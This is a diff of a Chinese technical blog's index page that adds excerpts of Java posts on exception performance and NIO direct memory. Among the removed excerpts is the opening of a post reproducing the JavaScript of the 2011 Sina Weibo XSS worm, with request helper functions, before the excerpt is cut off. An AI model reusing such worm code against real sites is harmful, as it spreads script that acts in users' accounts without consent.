@@ -261,6 +261,244 @@
             
               
                 
+                <a class="post-title-link" href="/2011/08/19/Exception的性能是差-原因在于ThrowablefillInStackTrace-方法/" itemprop="url">
+                  Exception的性能是差,原因在于ThrowablefillInStackTrace()方法
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2011-08-19T22:13:00+08:00" content="2011-08-19">
+              2011-08-19
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/Java/" itemprop="url" rel="index">
+                    <span itemprop="name">Java</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+           参见：http://www.blogjava.net/stone2083/archive/2010/07/09/325649.html根本原因在于:异常基类Throwable.java的public synchronized native Throwable fillInStackTrace()方法方法介绍:Fills in the execution stack trace. This method records within this Throwable object information about the current state of the stack frames for the current thread.性能开销在于:1. 是一个synchronized方法(主因)2. 需要填充线程运行堆栈信息&nbsp;另外透过JVM看Exception本质，可以看看Exception在底层是怎么实现的。&nbsp; 
+
+          
+
+          <div class="post-more-link text-center">
+            <a class="btn" href="/2011/08/19/Exception的性能是差-原因在于ThrowablefillInStackTrace-方法/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="//schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2011/08/19/NIO使用直接内存/" itemprop="url">
+                  NIO使用直接内存
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2011-08-19T15:38:00+08:00" content="2011-08-19">
+              2011-08-19
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/Java/" itemprop="url" rel="index">
+                    <span itemprop="name">Java</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+           直接内存（Direct Memory）并不是虚拟机运行时数据区的一部分，也不是Java虚拟机规范中定义的内存区域，但是这部分内存也被频繁地使用，而且也可能导致OutOfMemoryError 异常出现。在JDK 1.4 中新加入了NIO（New Input/Output）类，引入了一种基于通道（Channel）与缓冲区（Buffer）的I/O 方式，它可以使用Native 函数库直接分配堆外内存，然后通过一个存储在Java 堆里面的DirectByteBuffer 对象作为这块内存的引用进行操作。这样能在一些场景中显著提高性能，因为避免了在Java 堆和Native 堆中来回复制数据。&nbsp; 
+
+          
+
+          <div class="post-more-link text-center">
+            <a class="btn" href="/2011/08/19/NIO使用直接内存/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="//schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
                 <a class="post-title-link" href="/2011/08/19/Custom-Class-Loading-in-Dalvik/" itemprop="url">
                   Custom Class Loading in Dalvik
                 </a>
@@ -1211,242 +1449,6 @@ One of the highlights of the Android 2.0 SDK is that you can writ
 
 
     
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="//schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2011/07/23/Java-Generic-Class/" itemprop="url">
-                  Java Generic Class
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2011-07-23T14:34:00+08:00" content="2011-07-23">
-              2011-07-23
-            </time>
-          </span>
-
-          
-            <span class="post-category" >
-              &nbsp; | &nbsp;
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/Java/" itemprop="url" rel="index">
-                    <span itemprop="name">Java</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-
-          
-          
-
-          
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-           http://download.oracle.com/javase/tutorial/extra/generics/fineprint.htmlA Generic Class is Shared by All Its InvocationsWhat does the following code fragment print?List &lt;String&gt; l1 = new ArrayList&lt;String&gt;();&nbsp;List&lt;Integer&gt; l2 = new ArrayList&lt;Integer&gt;();&nbsp;System.out.println(l1.getClass() == l2.getClass());&nbsp;You might be tempted to say&nbsp;false, but you’d be wrong. It prints&nbsp;true, because all instances of a generic class have the same run-time class, reg
-          ...
-
-          <div class="post-more-link text-center">
-            <a class="btn" href="/2011/07/23/Java-Generic-Class/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="//schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2011/07/17/新浪微博的XSS攻击的JS代码/" itemprop="url">
-                  新浪微博的XSS攻击的JS代码
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2011-07-17T13:07:00+08:00" content="2011-07-17">
-              2011-07-17
-            </time>
-          </span>
-
-          
-            <span class="post-category" >
-              &nbsp; | &nbsp;
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/python-js-php-html-mysql-http/" itemprop="url" rel="index">
-                    <span itemprop="name">python/js/php/html/mysql/http</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-
-          
-          
-
-          
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-           新浪微博事件利用了微博广场页面 http://weibo.com/pub/star 的一个URL注入js脚本，发微博、发站内消息。更多参考http://coolshell.cn/articles/4914.htmlfunction createXHR(){&nbsp; &nbsp; return window.XMLHttpRequest?&nbsp; &nbsp; new XMLHttpRequest():&nbsp; &nbsp; new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);}function getappkey(url){&nbsp; &nbsp; xmlHttp = createXHR();&nbsp; &nbsp; xmlHttp.open(&quot;GET&quot;,url,false);&nbsp; &nbsp; xmlHttp.send();&nbsp; &nbsp; result = xmlHttp.responseText;&nbsp; &nbsp; id_arr = ‘’;&nbsp; &nbsp; id
-          ...
-
-          <div class="post-more-link text-center">
-            <a class="btn" href="/2011/07/17/新浪微博的XSS攻击的JS代码/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -1492,7 +1494,7 @@ One of the highlights of the Android 2.0 SDK is that you can writ
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">601</span>
+              <span class="site-state-item-count">603</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
@@ -1500,7 +1502,7 @@ One of the highlights of the Android 2.0 SDK is that you can writ
           
             <div class="site-state-item site-state-categories">
               <a href="/categories">
-                <span class="site-state-item-count">36</span>
+                <span class="site-state-item-count">37</span>
                 <span class="site-state-item-name">分类</span>
               </a>
             </div>
